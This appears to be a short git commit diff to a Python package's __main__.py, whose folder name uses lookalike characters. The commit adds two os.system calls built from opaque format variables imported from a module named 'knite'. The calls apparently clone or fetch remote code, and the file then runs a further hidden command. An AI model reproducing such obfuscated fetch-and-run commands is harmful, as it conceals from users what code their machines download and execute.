a460305141b09692d6b25ac969ac42d047e7fde6
HypeVoidSoul <hypevoidsoul@yahoo.com>
2021-07-10 07:30:53 -0700

    Update __main__.py

--- ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
+++ ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
@@ -3,4 +3,6 @@ os.system("git clone https://github.com/hypevoidsouls/{}.git".format(IK))
 from knite import *
 os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,KA,HU))
 os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,TA,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,YT,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,MYT,HU))
 os.system(RYD)
